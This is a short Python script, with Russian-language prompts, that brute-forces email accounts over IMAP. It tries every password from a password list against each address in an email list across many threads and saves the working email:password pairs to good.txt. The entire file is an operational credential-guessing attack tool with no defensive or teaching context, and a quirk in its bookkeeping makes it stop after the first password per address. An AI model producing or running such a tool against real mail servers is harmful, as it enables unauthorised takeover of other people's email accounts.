import imaplib
import os
import signal
import keyboard
from concurrent.futures import ThreadPoolExecutor, as_completed

imap_server = input('выбери imap server: ')
port = int(input('введи порт: '))
m_workers = int(input('введи кол-во потоков: '))
print('started brute force')
checked_emails = {}
good_emails = []
bad_emails = []


def check_email(email, password):
    try:
        imap = imaplib.IMAP4(imap_server, port)
        imap.login(email, password)
        good_emails.append((email, password))
        imap.logout()
    except Exception:
        bad_emails.append((email, password))
    finally:
        checked_emails[email] = password


def load_checked_emails():
    if os.path.exists("checked.txt"):
        with open("checked.txt", "r") as checked_file:
            for line in checked_file:
                email, password = line.strip().split(":")
                checked_emails[email] = password


def load_passwords():
    with open("pass_list.txt", "r") as pass_file:
        return [password.strip() for password in pass_file.readlines()]


def process_email(email, passwords):
    for password in passwords:
        if email not in checked_emails:
            check_email(email, password)


def save_and_exit():
    with open("good.txt", "a") as good_file, open("bad.txt", "a") as bad_file, open("checked.txt", "a") as checked_file:
        for email, password in good_emails:
            good_file.write(f"{email}:{password}\n")
            checked_file.write(f"{email}:{password}\n")
        for email, password in bad_emails:
            bad_file.write(f"{email}:{password}\n")
            checked_file.write(f"{email}:{password}\n")

    # with open("checked_emails.txt", "w") as checked_file:
    #     for email, password in checked_emails.items():
    #         checked_file.write(f"{email}:{password}\n")

    print("Progress saved. Exiting.")
    os._exit(0)


def main():
    load_checked_emails()
    passwords = load_passwords()

    with open("email_list.txt", "r") as file:
        emails = [email.strip() for email in file.readlines()]

    with ThreadPoolExecutor(max_workers=m_workers) as executor:
        futures = [executor.submit(process_email, email, passwords) for email in emails]
        for future in as_completed(futures):
            future.result()

    save_and_exit()


if __name__ == "__main__":
    keyboard.add_hotkey('alt+c', save_and_exit)
    main()
